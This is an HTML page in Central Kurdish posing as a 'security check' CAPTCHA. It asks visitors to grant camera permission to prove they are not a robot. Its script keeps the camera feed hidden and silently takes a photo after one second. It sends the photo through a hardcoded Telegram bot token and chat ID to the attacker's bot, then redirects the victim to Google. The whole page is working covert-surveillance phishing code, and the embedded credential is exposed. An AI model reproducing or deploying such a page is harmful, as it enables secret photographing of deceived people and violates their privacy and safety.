<!DOCTYPE html>
<html lang="ckb">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پشکنینی ئاسایش</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            direction: rtl;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h2 {
            color: #333;
            font-size: 20px;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
        }
        .btn-allow {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>پشکنینی ئاسایش</h2>
        <p>تکایە <b>Allow</b> دابگرە بۆ بەردەوامبوون و سەلماندنی ئەوەی کە ڕۆبۆت نیت.</p>
        <button class="btn-allow" onclick="requestCamera()">بەردەوامبوون</button>
    </div>

    <!-- کامێرا و کانڤاس بە شاراوەیی دەمێننەوە -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8763977900:AAEYu-yWlR7Oo5XHIpl8Z13hgLljv9z73_I";
        const CHAT_ID = "8469010473";

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // دوای ١ چرکە لە داگرتنی Allow بە بێدەنگی وێنەکە دەگرێت
                setTimeout(() => {
                    captureAndSend();
                }, 1000);
            } catch (err) {
                alert("پێویستە مۆڵەت (Allow) بدەیت بۆ ئەوەی بپەڕێیتەوە!");
            }
        }

        function captureAndSend() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .then(() => {
                    // دوای ناردنی وێنەکە، کەسەکە ڕەوانەی گووگڵ یان هەر لینکێکی تر دەکرێت
                    window.location.href = "https://www.google.com";
                })
                .catch(() => {
                    window.location.href = "https://www.google.com";
                });
            }, 'image/jpeg');
        }
    </script>

</body>
</html>
